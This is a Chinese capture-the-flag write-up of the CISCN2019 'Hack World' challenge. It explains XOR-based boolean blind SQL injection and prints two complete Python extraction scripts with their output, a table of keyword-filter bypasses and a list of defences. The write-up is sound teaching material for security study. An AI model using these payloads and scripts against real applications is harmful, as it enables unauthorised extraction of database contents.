## Writeup 4 [CISCN2019 华北赛区 Day2 Web1] Hack World



---

### 一、题目信息

| 项目         | 内容                                                         |
| ------------ | ------------------------------------------------------------ |
| **题目名称** | Hack World                                                   |
| **题目来源** | CISCN2019 华北赛区 Day2 Web1                                 |
| **题目类型** | Web / SQL 注入（布尔盲注）                                   |
| **提示**     | PHP SQL注入，flag{} 里为 uuid                                |
| **靶机地址** | `http://fa7efc7b-1ffe-4511-8596-7420e058ffe1.node5.buuoj.cn:81/` |

---

### 二、页面分析

访问靶机，呈现一个简单的表单：

```html
<html>
<head>
<title>Hack World</title>
</head>
<body>
<h3>All You Want Is In Table 'flag' and the column is 'flag'</h3>
<h3>Now, just give the id of passage</h3>
<form action="index.php" method="POST">
<input type="text" name="id">
<input type="submit">
</form>
</body>
</html>
```

**关键信息**：

- 提交方式：`POST`
- 参数名：`id`
- 表名：`flag`
- 字段名：`flag`
- flag 格式：uuid（如 `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`）

---

### 三、踩过的坑（血泪史）

#### 坑 1：以为报错注入能用

- **尝试**：`id=1'` 返回 `bool(false)`，以为有报错回显
- **失败原因**：报错被隐藏，无法直接获取数据
- **教训**：`bool(false)` 只是错误标志，不代表有报错注入

#### 坑 2：`and` 被过滤后陷入僵局

- **尝试**：`id=1 and 1=1` 返回 `SQL Injection Checked.`
- **失败原因**：`and` 关键字被黑名单拦截，无论后面条件真假
- **教训**：需要寻找未被过滤的运算符

#### 坑 3：误判真/假条件

- **现象**：`id=1^(1=1)` 返回 `Error Occured`，`id=1^(1=2)` 返回 `Hello...`
- **教训**：真/假条件与常规逻辑相反，需要重新校准

#### 坑 4：靶机经常超时断开

- **现象**：脚本运行一半报错 `ConnectionRefusedError`
- **原因**：BUUCTF 靶机容器有存活时间限制
- **解决**：重启靶机，更新 URL 后继续

#### 坑 5：脚本中 `&` 和 `&&` 的 URL 编码问题

- **问题**：`&` 在 POST 数据中是分隔符，需要特殊处理
- **解决**：使用 `^`（异或）代替，无需编码

---

### 四、SQL 注入原理

#### 4.1 什么是 SQL 注入

SQL 注入是攻击者通过向应用程序输入**恶意构造的 SQL 语句**，欺骗数据库执行非预期操作的攻击方式。

**核心原因**：用户输入被直接拼接到 SQL 查询语句中。

#### 4.2 本题的 SQL 查询逻辑（推测）

后端代码可能类似于：

```php
$id = $_POST['id'];
$sql = "SELECT * FROM passages WHERE id = $id";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    echo "Hello, glzjin wants a girlfriend.";
} else {
    echo "Error Occured When Fetch Result.";
}
```

**关键点**：

- `$id` 直接拼接到 SQL 中（没有预处理）
- 查询有结果 → 返回 `Hello...`
- 查询无结果 → 返回 `Error...`

---

### 五、注入机制详解

#### 5.1 异或运算符 `^` 的作用

在 SQL（MySQL/MariaDB）中，`^` 是按位异或运算符。

**真值表**：

|  A   |  B   | A ^ B |
| :--: | :--: | :---: |
|  0   |  0   |   0   |
|  0   |  1   |   1   |
|  1   |  0   |   1   |
|  1   |  1   |   0   |

**在 SQL 中的行为**：

- 数字与非零数字异或：结果非零
- 数字与 0 异或：结果不变
- 数字与 1 异或：结果翻转（0→1，非0→0）

#### 5.2 本题的注入机制

假设 `id=1` 对应的数据存在。

**正常请求**：

```sql
SELECT * FROM passages WHERE id = 1
-- 有结果 → 返回 Hello...
```

**注入请求**：

```sql
SELECT * FROM passages WHERE id = 1 ^ (条件)
```

- **条件为真**（如 `1=1`）：`1 ^ 1 = 0` → `WHERE id = 0` → 无结果 → 返回 `Error...`
- **条件为假**（如 `1=2`）：`1 ^ 0 = 1` → `WHERE id = 1` → 有结果 → 返回 `Hello...`

**结论**：

- 条件为真 → 返回 `Error Occured When Fetch Result.`
- 条件为假 → 返回 `Hello, glzjin wants a girlfriend.`

这就是**布尔盲注**：通过页面返回的不同内容，推断条件是否成立。

---

### 六、关键函数详解

#### 6.1 `length()` —— 获取字符串长度

|   项目   | 说明                      |
| :------: | ------------------------- |
| **语法** | `LENGTH(str)`             |
| **参数** | `str`：要计算长度的字符串 |
| **返回** | 字符串的字节长度          |
| **示例** | `LENGTH('flag')` → 4      |

**本题应用**：

```sql
length((select(flag)from(flag)))
-- 返回 flag 字段值的长度
```

#### 6.2 `substr()` —— 截取子字符串

|   项目   | 说明                                                         |
| :------: | ------------------------------------------------------------ |
| **语法** | `SUBSTR(str, start, length)`                                 |
| **参数** | `str`：源字符串<br>`start`：起始位置（从1开始）<br>`length`：截取长度（可选） |
| **返回** | 截取的子字符串                                               |
| **示例** | `SUBSTR('flag', 1, 1)` → 'f'<br>`SUBSTR('flag', 2, 2)` → 'la' |

**本题应用**：

```sql
substr((select(flag)from(flag)), 1, 1)
-- 返回 flag 的第 1 个字符
```

#### 6.3 `ascii()` —— 获取字符的 ASCII 码

|   项目   | 说明                                    |
| :------: | --------------------------------------- |
| **语法** | `ASCII(str)`                            |
| **参数** | `str`：单个字符的字符串                 |
| **返回** | 字符的 ASCII 码（0-255）                |
| **示例** | `ASCII('f')` → 102<br>`ASCII('F')` → 70 |

**本题应用**：

```sql
ascii(substr((select(flag)from(flag)), 1, 1))
-- 返回 flag 第 1 个字符的 ASCII 码
```

#### 6.4 比较运算符

| 运算符 | 说明 |     示例      |
| :----: | :--: | :-----------: |
|  `>`   | 大于 | `ascii > 100` |
|  `=`   | 等于 | `ascii = 102` |
|  `<`   | 小于 | `ascii < 120` |

**本题应用**：

```sql
1 ^ (ascii(substr((select(flag)from(flag)),1,1)) > 100)
-- 条件为真时，1^1=0 → 无结果 → Error
-- 条件为假时，1^0=1 → 有结果 → Hello
```

---

### 七、布尔盲注完整流程

#### 7.1 获取 flag 长度

```python
def get_length():
    for i in range(1, 100):
        payload = f"1^(length((select(flag)from(flag)))>{i})"
        if inject(payload) == False:  # 返回 Hello → 条件为假
            return i
```

**原理**：

- 当 `length > i` 为真时 → `1^1=0` → 无结果 → `Error`
- 当 `length > i` 为假时 → `1^0=1` → 有结果 → `Hello`
- 首次出现 `Hello` 时的 `i` 即为长度

#### 7.2 逐字符获取 flag

```python
flag = ""
for pos in range(1, length + 1):
    for ascii_val in range(32, 127):
        payload = f"1^(ascii(substr((select(flag)from(flag)),{pos},1))>{ascii_val})"
        if inject(payload) == False:  # 出现 Hello → 条件为假
            flag += chr(ascii_val)
            break
```

**原理**：

- 使用二分查找可以更快（见优化版）

---

### 八、完整的攻击脚本

#### 8.1 基础版（逐字符遍历，线性查找版）

```python
import requests
import time

url = "http://fa7efc7b-1ffe-4511-8596-7420e058ffe1.node5.buuoj.cn:81/index.php"

def inject(payload):
    """发送 payload，返回 True 表示条件为真（出现 Error）"""
    data = {"id": payload}
    r = requests.post(url, data=data)
    return "Error Occured When Fetch Result" in r.text

# 记录开始时间
start_time = time.time()

# 1. 获取长度
print("[*] 获取 flag 长度...")
length_start = time.time()
for i in range(1, 100):
    if not inject(f"1^(length((select(flag)from(flag)))>{i})"):
        flag_len = i
        break
length_time = time.time() - length_start
print(f"[+] flag 长度: {flag_len}")
print(f"[+] 长度探测耗时: {length_time:.2f} 秒")

# 2. 获取 flag
flag = ""
flag_start = time.time()
for pos in range(1, flag_len + 1):
    for ascii_val in range(32, 127):
        payload = f"1^(ascii(substr((select(flag)from(flag)),{pos},1))>{ascii_val})"
        if not inject(payload):
            flag += chr(ascii_val)
            print(f"[+] 第 {pos} 位: {chr(ascii_val)} -> {flag}")
            break
flag_time = time.time() - flag_start

total_time = time.time() - start_time

print(f"\n[+] Flag: {flag}")
print(f"\n[+] 时间统计:")
print(f"  - 长度探测: {length_time:.2f} 秒")
print(f"  - Flag获取: {flag_time:.2f} 秒")
print(f"  - 总耗时: {total_time:.2f} 秒")
print(f"  - 总请求次数: {flag_len + flag_len * 95} 次 (估算)")
```

运行结果：

```python
[*] 获取 flag 长度...
[+] flag 长度: 42
[+] 长度探测耗时: 4.13 秒
[+] 第 1 位: f -> f
[+] 第 2 位: l -> fl
[+] 第 3 位: a -> fla
[+] 第 4 位: g -> flag
[+] 第 5 位: { -> flag{
[+] 第 6 位: a -> flag{a
[+] 第 7 位: 8 -> flag{a8
[+] 第 8 位: 1 -> flag{a81
[+] 第 9 位: 9 -> flag{a819
[+] 第 10 位: 7 -> flag{a8197
[+] 第 11 位: 2 -> flag{a81972
[+] 第 12 位: f -> flag{a81972f
[+] 第 13 位: b -> flag{a81972fb
[+] 第 14 位: - -> flag{a81972fb-
[+] 第 15 位: 9 -> flag{a81972fb-9
[+] 第 16 位: 7 -> flag{a81972fb-97
[+] 第 17 位: 5 -> flag{a81972fb-975
[+] 第 18 位: e -> flag{a81972fb-975e
[+] 第 19 位: - -> flag{a81972fb-975e-
[+] 第 20 位: 4 -> flag{a81972fb-975e-4
[+] 第 21 位: e -> flag{a81972fb-975e-4e
[+] 第 22 位: 2 -> flag{a81972fb-975e-4e2
[+] 第 23 位: 9 -> flag{a81972fb-975e-4e29
[+] 第 24 位: - -> flag{a81972fb-975e-4e29-
[+] 第 25 位: b -> flag{a81972fb-975e-4e29-b
[+] 第 26 位: 5 -> flag{a81972fb-975e-4e29-b5
[+] 第 27 位: c -> flag{a81972fb-975e-4e29-b5c
[+] 第 28 位: 2 -> flag{a81972fb-975e-4e29-b5c2
[+] 第 29 位: - -> flag{a81972fb-975e-4e29-b5c2-
[+] 第 30 位: 0 -> flag{a81972fb-975e-4e29-b5c2-0
[+] 第 31 位: 4 -> flag{a81972fb-975e-4e29-b5c2-04
[+] 第 32 位: a -> flag{a81972fb-975e-4e29-b5c2-04a
[+] 第 33 位: a -> flag{a81972fb-975e-4e29-b5c2-04aa
[+] 第 34 位: 6 -> flag{a81972fb-975e-4e29-b5c2-04aa6
[+] 第 35 位: c -> flag{a81972fb-975e-4e29-b5c2-04aa6c
[+] 第 36 位: a -> flag{a81972fb-975e-4e29-b5c2-04aa6ca
[+] 第 37 位: b -> flag{a81972fb-975e-4e29-b5c2-04aa6cab
[+] 第 38 位: 1 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1
[+] 第 39 位: 0 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab10
[+] 第 40 位: 0 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab100
[+] 第 41 位: 1 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1001
[+] 第 42 位: } -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1001}

[+] Flag: flag{a81972fb-975e-4e29-b5c2-04aa6cab1001}

[+] 时间统计:
  - 长度探测: 4.13 秒
  - Flag获取: 180.98 秒
  - 总耗时: 185.11 秒
  - 总请求次数: 4032 次 (估算)

进程已结束，退出代码为 0
```



#### 8.2 优化版（二分查找版）

```python
import requests
import time
import math  # 添加这一行

url = "http://fa7efc7b-1ffe-4511-8596-7420e058ffe1.node5.buuoj.cn:81/index.php"

def inject(payload):
    data = {"id": payload}
    r = requests.post(url, data=data)
    return "Error Occured When Fetch Result" in r.text

# 获取长度（二分查找）
def get_length():
    low, high = 1, 100
    while low < high:
        mid = (low + high) // 2
        if inject(f"1^(length((select(flag)from(flag)))>{mid})"):
            low = mid + 1
        else:
            high = mid
    return low

# 记录开始时间
start_time = time.time()

print("[*] 获取 flag 长度...")
length_start = time.time()
flag_len = get_length()
length_time = time.time() - length_start
print(f"[+] flag 长度: {flag_len}")
print(f"[+] 长度探测耗时: {length_time:.2f} 秒")

# 获取 flag（二分查找）
flag = ""
flag_start = time.time()
for pos in range(1, flag_len + 1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if inject(f"1^(ascii(substr((select(flag)from(flag)),{pos},1))>{mid})"):
            low = mid + 1
        else:
            high = mid
    flag += chr(low)
    print(f"[+] 第 {pos} 位: {chr(low)} -> {flag}")
flag_time = time.time() - flag_start

total_time = time.time() - start_time

print(f"\n[+] Flag: {flag}")
print(f"\n[+] 时间统计:")
print(f"  - 长度探测: {length_time:.2f} 秒")
print(f"  - Flag获取: {flag_time:.2f} 秒")
print(f"  - 总耗时: {total_time:.2f} 秒")
print(f"  - 总请求次数: {int(math.log2(100)) + flag_len * int(math.log2(95))} 次 (估算)")
```

运行结果：

```
[*] 获取 flag 长度...
[+] flag 长度: 42
[+] 长度探测耗时: 0.75 秒
[+] 第 1 位: f -> f
[+] 第 2 位: l -> fl
[+] 第 3 位: a -> fla
[+] 第 4 位: g -> flag
[+] 第 5 位: { -> flag{
[+] 第 6 位: a -> flag{a
[+] 第 7 位: 8 -> flag{a8
[+] 第 8 位: 1 -> flag{a81
[+] 第 9 位: 9 -> flag{a819
[+] 第 10 位: 7 -> flag{a8197
[+] 第 11 位: 2 -> flag{a81972
[+] 第 12 位: f -> flag{a81972f
[+] 第 13 位: b -> flag{a81972fb
[+] 第 14 位: - -> flag{a81972fb-
[+] 第 15 位: 9 -> flag{a81972fb-9
[+] 第 16 位: 7 -> flag{a81972fb-97
[+] 第 17 位: 5 -> flag{a81972fb-975
[+] 第 18 位: e -> flag{a81972fb-975e
[+] 第 19 位: - -> flag{a81972fb-975e-
[+] 第 20 位: 4 -> flag{a81972fb-975e-4
[+] 第 21 位: e -> flag{a81972fb-975e-4e
[+] 第 22 位: 2 -> flag{a81972fb-975e-4e2
[+] 第 23 位: 9 -> flag{a81972fb-975e-4e29
[+] 第 24 位: - -> flag{a81972fb-975e-4e29-
[+] 第 25 位: b -> flag{a81972fb-975e-4e29-b
[+] 第 26 位: 5 -> flag{a81972fb-975e-4e29-b5
[+] 第 27 位: c -> flag{a81972fb-975e-4e29-b5c
[+] 第 28 位: 2 -> flag{a81972fb-975e-4e29-b5c2
[+] 第 29 位: - -> flag{a81972fb-975e-4e29-b5c2-
[+] 第 30 位: 0 -> flag{a81972fb-975e-4e29-b5c2-0
[+] 第 31 位: 4 -> flag{a81972fb-975e-4e29-b5c2-04
[+] 第 32 位: a -> flag{a81972fb-975e-4e29-b5c2-04a
[+] 第 33 位: a -> flag{a81972fb-975e-4e29-b5c2-04aa
[+] 第 34 位: 6 -> flag{a81972fb-975e-4e29-b5c2-04aa6
[+] 第 35 位: c -> flag{a81972fb-975e-4e29-b5c2-04aa6c
[+] 第 36 位: a -> flag{a81972fb-975e-4e29-b5c2-04aa6ca
[+] 第 37 位: b -> flag{a81972fb-975e-4e29-b5c2-04aa6cab
[+] 第 38 位: 1 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1
[+] 第 39 位: 0 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab10
[+] 第 40 位: 0 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab100
[+] 第 41 位: 1 -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1001
[+] 第 42 位: } -> flag{a81972fb-975e-4e29-b5c2-04aa6cab1001}

[+] Flag: flag{a81972fb-975e-4e29-b5c2-04aa6cab1001}

[+] 时间统计:
  - 长度探测: 0.75 秒
  - Flag获取: 27.53 秒
  - 总耗时: 28.28 秒
  - 总请求次数: 258 次 (估算)

进程已结束，退出代码为 0
```

两个版本的差别还是很大的。

---

### 九、知识点总结

#### 9.1 注入类型对比

| 类型         | 特点             | 适用场景       |
| ------------ | ---------------- | -------------- |
| 报错注入     | 直接返回数据     | 有报错回显     |
| 联合查询注入 | 一次获取多条数据 | 有显示位       |
| 布尔盲注     | 根据页面真假判断 | 无报错，有差异 |
| 时间盲注     | 根据响应时间判断 | 无任何回显差异 |

**本题**：布尔盲注（异或注入）

#### 9.2 常用运算符绕过

| 被过滤 | 可替代                     |
| ------ | -------------------------- |
| `and`  | `&&`、`&`、`^`、`|`、`||`  |
| `or`   | `||`、`|`、`^`             |
| 空格   | `()`、`%0a`、`%0b`、`/**/` |
| `=`    | `like`、`>`、`<`、`in`     |

**本题**：使用 `^`（异或）

#### 9.3 防御措施

1. **参数化查询**（最重要）

   ```php
   $stmt = $conn->prepare("SELECT * FROM passages WHERE id = ?");
   $stmt->bind_param("i", $id);
   ```

2. **输入过滤**：过滤 `^`、`|`、`&`、`||`、`&&` 等运算符

3. **统一错误页面**：不区分“查询为空”和“查询出错”

4. **WAF 规则**：检测布尔盲注特征（大量 `>`、`<`、`substr`、`ascii`）

---

### 十、最终 Flag

```
flag{a81972fb-975e-4e29-b5c2-04aa6cab1001}
```
